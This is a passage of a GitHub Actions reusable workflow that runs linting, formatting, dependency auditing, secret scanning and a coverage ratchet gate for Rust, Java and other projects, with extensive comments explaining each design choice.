      # rejected (125 findings, 118 of them one first-party artifact, versus 3
      # at the granularity deptry is designed for).
      - name: Unused and undeclared dependencies (deptry)
        if: inputs.dead-code != 'off'
        uses: maximalcode/maxi-quality/actions/deadcode@v1
        with:
          tool: deptry
          dir: ${{ matrix.dir }}
          mode: ${{ inputs.dead-code }}
          changed-only: ${{ inputs.changed-only }}

  # Rust rides the reusable workflow like every other language (#70). It used to
  # be a job scripts/adopt.sh stamped into the CONSUMER's workflow file, on the
  # argument that the toolchain bump should be visible in the consumer's own
  # diff. That argument lost to the one CONCEPT G1 is built on: a scaffolded job
  # only moves when someone re-runs adopt.sh, which is copy-paste-drift with
  # extra steps. The pins live HERE now, and `rust-version` is the input for a
  # consumer who genuinely needs to hold one back.
  #
  # clippy IS the conventions layer for Rust — Semgrep's Rust support is
  # experimental and stays out — so this job is Layer 1 and Layer 2's Rust
  # story at once. Layer 2 itself needs nothing Rust-specific: Gitleaks is
  # language-agnostic and OSV-Scanner reads Cargo.lock natively.
  rust:
    needs: detect
    if: needs.detect.outputs.has_rust == 'true'
    runs-on: ${{ inputs.runner }}
    strategy:
      fail-fast: false
      matrix:
        dir: ${{ fromJSON(needs.detect.outputs.rust_dirs) }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      # Self-hosted runners install rustup per-user into ~/.cargo/bin, and the
      # runner's non-login service shell does not have that on PATH — so the
      # toolchain step below dies with `rustup: command not found` even on a
      # correctly provisioned box (#209). Hosted images carry rustup
      # system-wide, which is what masked this. Prepending unconditionally is
      # a no-op wherever rustup is already reachable, and GITHUB_PATH carries
      # it to every later step of the job.
      - name: Put cargo's user bin dir on PATH (self-hosted runners)
        shell: bash
        run: echo "$HOME/.cargo/bin" >> "$GITHUB_PATH"

      # env:, not a splice into the script — the dotnet job below spells out
      # why at length. This value is an input rather than a globbed filename,
      # so the exposure is smaller, but the habit is the mitigation.
      - name: Pinned Rust toolchain
        shell: bash
        env:
          RUST_VERSION: ${{ inputs.rust-version }}
        run: |
          set -Eeuo pipefail
          rustup toolchain install "$RUST_VERSION" --profile minimal --component clippy,rustfmt
          rustup default "$RUST_VERSION"

      # cargo-deny is pinned here and is deliberately NOT an input, unlike the
      # toolchain: the checksum below is bound to this exact version, so a
      # version input without a matching checksum input would either break the
      # verification or invite dropping it. Verifying the download is what makes
      # this "we downloaded THAT binary" rather than "we downloaded a binary" —
      # the same standard every SHA-pinned `uses:` line here meets, in a shape
      # `uses:` cannot express. Bump the two together.
      - name: Pinned cargo-deny (checksum-verified)
        shell: bash
        env:
          CARGO_DENY_SHA256: '9f12ed4c49936e09b48bf862b595cde2fe64fcbd9d74dfacac6131ca824c8d5f'
        run: |
          set -Eeuo pipefail
          curl -sSfL -o /tmp/cargo-deny.tgz \
            https://github.com/EmbarkStudios/cargo-deny/releases/download/0.20.2/cargo-deny-0.20.2-x86_64-unknown-linux-musl.tar.gz
          echo "${CARGO_DENY_SHA256}  /tmp/cargo-deny.tgz" | sha256sum -c -
          tar xzf /tmp/cargo-deny.tgz -C "$HOME/.cargo/bin" --strip-components=1 \
            cargo-deny-0.20.2-x86_64-unknown-linux-musl/cargo-deny

      - name: Format, lint and audit
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -Eeuo pipefail
          # --all / --workspace on BOTH, and they are load-bearing rather than
          # belt-and-braces. Without a package selection flag cargo operates on
          # `default-members`, which defaults to the ROOT PACKAGE ALONE whenever
          # the root manifest has a [package] section — the cargo book puts it
          # flatly: "when a root package is present, you can only operate on it
          # using --package and --workspace flags". So on the extremely common
          # root-package-plus-members layout, a bare `cargo clippy` passes
          # having never opened a single member crate. That is #70's own bug,
          # one directory down, and detection cannot see it because the members
          # are genuinely covered by the root's lockfile.
          cargo fmt --all --check
          # -Dwarnings HERE and not in the manifest: a contributor's local
          # `cargo check` should warn them, not wall them mid-refactor. CI is
          # the gate. --locked is why detection refuses a crate with no
          # lockfile: without one this line cannot run at all.
          RUSTFLAGS=-Dwarnings cargo clippy --workspace --all-targets --locked
          # advisories covers what cargo-audit would (the same RustSec feed);
          # add 'licenses' once deny.toml's allowlist holds your policy.
          # cargo-deny reads the whole workspace graph already.
          cargo deny check advisories bans

  # Java rides the reusable workflow like every other language. The pins live
  # HERE rather than in a job adopt.sh stamps into the consumer's file, which is
  # #70's decision applied to a fifth language: a scaffolded job only moves when
  # someone re-runs adopt.sh, and that is copy-paste-drift with extra steps.
  #
  # What the CONSUMER copies is only what Maven forces — the lint region in
  # their own pom.xml, because Maven has no remote lint consumption. The CI is
  # ordinary.
  #
  # Layer 2 needs nothing Java-specific: Gitleaks is language-agnostic and
  # OSV-Scanner reads pom.xml natively. Unlike Rust, semgrep DOES support Java
  # well, so the Java conventions are real Layer 2 rules rather than being
  # folded into the Layer 1 analyzer.
  java:
    needs: detect
    if: needs.detect.outputs.has_java == 'true'
    runs-on: ${{ inputs.runner }}
    strategy:
      fail-fast: false
      matrix:
        dir: ${{ fromJSON(needs.detect.outputs.java_dirs) }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-java@dd06d9cba3e5552c54d9f8ea23572deb30010f7c # v6.0.0
        with:
          distribution: temurin
          java-version: ${{ inputs.java-version }}
          cache: maven

      # THE GATE IS THE COMPILE. Error Prone and NullAway are javac plugins, so
      # `mvn compile` IS the analysis run — the same shape as .NET, where
      # TreatWarningsAsErrors makes a plain build the gate.
      #
      # test-compile, not compile: a test source set the analyzer never opens is
      # the commonest way a Java gate half-runs, and test code is where the
      # null-safety bugs that reach production get written.
      #
      # -B and --no-transfer-progress keep the log readable; -e is deliberately
      # absent, because a stack trace per finding buries the findings.
      - name: Compile with Error Prone and NullAway
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -uo pipefail
          rc=0; out=$(mvn -B --no-transfer-progress test-compile 2>&1) || rc=$?
          echo "$out"
          # THE HALF-REPORT WARNING, and it is the reason this step is a script
          # rather than one `run: mvn` line. When javac's own -Xlint produces a
          # warning AND -Werror is set, the compile ends before Error Prone
          # runs, so every Error Prone and NullAway finding is missing from the
          # output above. The build is correctly RED either way — a GREEN build
          # is one where Error Prone did run — but a reader who takes this log
          # for the complete list is wrong by however many the analyzer would
          # have added. Measured 2026-08-09; configs/java/pom-lints.xml carries
          # the detail and samples/java-lint pins it.
          if [[ $rc -ne 0 ]] && grep -q 'warnings found and -Werror specified' <<<"$out"; then
            echo '::warning::javac -Xlint warnings ended this compile before the Error Prone pass ran, so the findings above are NOT the complete list. Fix the lint warnings and re-run to see what the analyzer adds.'
          fi
          exit $rc

      # The formatter, deliberately a separate step and a separate red check —
      # the same split as `dotnet format whitespace` versus the build gate. One
      # red check meaning two unrelated things is what that split exists to
      # avoid, and spotless is not bound to a lifecycle phase for the same
      # reason Rust's -Dwarnings lives in the job.
      - name: Everything the formatter owns must already be formatted
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: mvn -B --no-transfer-progress spotless:check

  layer2:
    runs-on: ${{ inputs.runner }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          # Gitleaks scans commit history, not just the tree.
          fetch-depth: 0
      # Pinned by commit-SHA: the v1 tag still names which release lineage this is,
      # but a SHA means a moved tag cannot change which action revision runs
      # inside a consumer workflow that is itself SHA-pinned to this file.
      # Bump the two together: the SHA is the v1 tag's commit, and the comment
      # records the lineage the SHA was taken from.
      - uses: maximalcode/maxi-quality/actions/layer2@27d3c69c4f9b9319e2974871f8c46605b4930a44 # v1
        with:
          changed-only: ${{ inputs.changed-only }}
          licenses: ${{ inputs.licenses }}
          annotate: ${{ inputs.annotate }}
          max-annotations: ${{ inputs.max-annotations }}

  # Coverage — off unless `coverage-report:` names an artifact (#75, #124).
  #
  # WHY AN ARTIFACT AND NOT A PATH. Coverage needs the consumer's TESTS to have
  # run, and this workflow is a separate job graph from the caller's — it does
  # not share a filesystem with it. An artifact is the one hand-off GitHub
  # gives two jobs in the same run that never share a runner. So the consumer's
  # own test job uploads, and this downloads.
  #
  # WHY `if:` AND NOT A SKIPPED STEP. With the input unset there is no coverage
  # job in the graph at all. v1 is a MOVING TAG: a job that merely skipped would
  # still appear, and every already-adopted consumer would grow a new box in
  # their PR checks the morning this ships.
  coverage:
    if: inputs.coverage-report != ''
    runs-on: ${{ inputs.runner }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          # The patch gate diffs against the merge base, which a shallow clone
          # does not contain. The action can deepen one itself, but doing it
          # here is one fetch instead of three.
          fetch-depth: 0

      - name: Download the coverage report
        id: download
        continue-on-error: true
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: ${{ inputs.coverage-report }}
          path: ${{ runner.temp }}/coverage-report

      # download-artifact's own failure says "unable to find any artifacts" and
      # never prints the name it looked for, so a typo reads like "coverage is
      # not configured here". It has to name what it wanted.
      - name: A named artifact that is not there is an error
        if: steps.download.outcome != 'success'
        shell: bash
        env:
          ARTIFACT: ${{ inputs.coverage-report }}
        run: |
          echo "::error::coverage-report: no artifact named '${ARTIFACT}' in this run. Nothing was gated. Check the name matches the one your test job uploads, that the upload step ran, and that the quality.yml call has a needs: edge from it — a job that starts before the upload finishes finds nothing."
          exit 1

      # Found by CONTENT, not by filename: coverage.xml, cobertura.xml,
      # lcov.info and coverage.info are all in circulation and CI configs rename
      # them freely. The action already detects format this way; this is the
      # same rule applied one level up, to which files in the artifact are
      # reports at all.
      - name: Find the reports inside the artifact
        id: find
        shell: bash
        env:
          DIR: ${{ runner.temp }}/coverage-report
          ARTIFACT: ${{ inputs.coverage-report }}
        run: |
          set -Eeuo pipefail
          found=()
          while IFS= read -r -d '' f; do
            if head -c 4096 "$f" | grep -qE '^(SF:|DA:|LF:|LH:)'; then
              found+=("$f")
            elif head -c 4096 "$f" | grep -q '<coverage'; then
              found+=("$f")
            fi
          done < <(find "$DIR" -type f -size -64M -print0 2>/dev/null)

          if [[ ${#found[@]} -eq 0 ]]; then
            echo "::error::coverage-report: artifact '${ARTIFACT}' downloaded, but none of its files is an lcov or Cobertura report. An artifact that exists and holds no report must not read as a passing gate. Files found: $(find "$DIR" -type f | head -20 | tr '\n' ' ')"
            exit 1
          fi

          printf 'found %s report(s) in %s:\n' "${#found[@]}" "$ARTIFACT"
          printf '  %s\n' "${found[@]}"
          {
            echo 'reports<<EOF'
            printf '%s\n' "${found[@]}"
            echo 'EOF'
          } >> "$GITHUB_OUTPUT"

      # #75's third question: a first run must not look like a broken gate. The
      # action refuses to compare against nothing, which is right and reads as
      # an unexplained failure unless the way out is written here, in terms of
      # the input the consumer actually set.
      - name: A missing floor must say exactly how to record one
        if: inputs.coverage-raise != 'true'
        shell: bash
        env:
          FLOOR_FILE: ${{ inputs.coverage-floor-file }}
        run: |
          set -Eeuo pipefail
          if [[ -f "$FLOOR_FILE" ]]; then
            echo "floor: $FLOOR_FILE"
            exit 0
          fi
          cat <<MSG
          ::error::coverage-report is set but ${FLOOR_FILE} does not exist. A ratchet with nothing to compare against reports ok at any coverage, so this fails instead of passing. Record the floor once:
          ::error::  1. add   coverage-raise: 'true'   to the quality.yml call, and push.
          ::error::  2. that run prints the floor file's contents under "RECORDED FLOOR".
          ::error::  3. save it as ${FLOOR_FILE} in this repo, commit it, and remove coverage-raise.
          MSG
          exit 1

      - name: Coverage gate
        id: cov
        uses: maximalcode/maxi-quality/actions/coverage@v1
        with:
          report: ${{ steps.find.outputs.reports }}
          floor-file: ${{ inputs.coverage-floor-file }}
          patch-threshold: ${{ inputs.coverage-patch-threshold }}
          raise: ${{ inputs.coverage-raise }}

      # Step 2 of the bootstrap. The action writes the floor and deliberately
      # does not commit it, so the only way the consumer gets the file is if the
      # log hands it to them.
      - name: Print the floor to commit
        if: inputs.coverage-raise == 'true' && steps.cov.outputs.raised == 'true'
        shell: bash
        env:
          FLOOR_FILE: ${{ inputs.coverage-floor-file }}
        run: |
          set -Eeuo pipefail
          echo '--- RECORDED FLOOR ---'
          echo "Save the block below as ${FLOOR_FILE}, commit it, then remove"
          echo "coverage-raise from the quality.yml call."
          echo
          cat "$FLOOR_FILE"
          echo
          echo '--- end ---'
          {
            echo '### Coverage floor recorded'
            echo
            echo "Commit this as \`${FLOOR_FILE}\`, then remove \`coverage-raise\`."
            echo
            echo '```json'
            cat "$FLOOR_FILE"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
